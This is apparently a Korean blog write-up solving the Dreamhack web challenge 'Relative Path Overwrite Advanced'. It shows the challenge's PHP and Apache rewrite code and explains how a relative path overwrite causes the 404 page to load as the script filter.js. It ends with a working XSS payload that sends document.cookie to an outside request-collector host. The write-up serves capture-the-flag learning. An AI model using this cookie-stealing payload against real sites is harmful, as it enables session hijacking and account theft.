---
title : Dreamhack - Relative Path Overwrite Advanced
categories: [Dreamhack, Webhacking]
date: 2022-04-24 13:14 +0900
tags: [Relative Path Overwrite, RPO]
---

## Relative Path Overwrite Advanced
<hr style="border-top: 1px solid;"><br>

변경된 부분

+ vuln.php

```php
<script src="filter.js"></script>
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var param = `<?php echo str_replace("`", "", $_GET['param']); ?>`;
    if (typeof filter === 'undefined') {
        param = "nope !!";
    }
    else {
        for (var i = 0; i < filter.length; i++) {
            if (param.toLowerCase().includes(filter[i])) {
                param = "nope !!";
                break;
            }
        }
    }

    param_elem.innerHTML = param;
</script>
```

<br>

+ ```000-default.conf```

```
RewriteEngine on
RewriteRule ^/(.*)\.(js|css)$ /static/$1 [L]

ErrorDocument 404 /404.php
```

<br>

+ 404.php

```php
<?php 
    header("HTTP/1.1 200 OK");
    echo $_SERVER["REQUEST_URI"] . " not found."; 
?>
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

rewriterule을 보면 404 에러가 뜨면 404.php가 해당 페이지에서 적용된다. 

예를 들어, ```/test.php```로 가면 404 error가 뜨므로 404.php가 적용되어서 ```/test.php not found.```라고 출력된다.

<br>

filter.js 코드를 불러오지 못하면 param=nope로 설정되어 DOM XSS를 할 수 없다.

그러나 문제는 static 폴더 안에 있는 filter.js가 안불러와져서 다른 방법을 이용해야 한다. (의도된 거?)

우선 확인을 해보았다.

<br>

+ ```http://host1.dreamhack.games:11710/?page=vuln```

![image](https://user-images.githubusercontent.com/52172169/164959478-731ae3e8-3877-48d2-afd8-4c180bb0f823.png)

<br>

+ ```http://host1.dreamhack.games:11710/index.php/?page=vuln```

![image](https://user-images.githubusercontent.com/52172169/164959492-aff15465-1ba4-48f4-8ceb-3c7449abb5a6.png)

<br>

그러면 filter.js가 로드되긴 하지만 404.php 코드가 적용되면서 위에 처럼 뜨게 된다.

중요한 점은 filter.js 자바스크립트 코드가 일단 로드된다는 점이다. 즉, 에러만 없다면 실행이 된다는 것이다.

**강의 내용에서 ```자바스크립트는 로드하는 코드 내에서 에러가 발생할 경우, 전체 코드를 실행하지 않기 때문에 문법 에러가 발생하지 않도록 신경써야 한다```를 기억해야 한다.**

<br>

+ ```http://host1.dreamhack.games:11710/index.php/;alert();///?page=vuln```

![image](https://user-images.githubusercontent.com/52172169/164959760-41812882-4f0c-4b70-98f1-3db5e1fe8a00.png)

<br>

위에 처럼 입력하면 alert가 실행된다. 

payload
: ```index.php/;location.href='https://iaxigfe.request.dreamhack.games/'+document.cookie;//?page=vuln```

<br>

single quote로 감싸면 인코딩을 안하는데 double quote는 인코딩을 하여 적용되지 않게 된다. 

URL 인코딩
: <a href="https://developers.google.com/maps/url-encoding?hl=ko" target="_blank">developers.google.com/maps/url-encoding?hl=ko</a>

<br><br>
<hr style="border: 2px solid;">
<br><br>
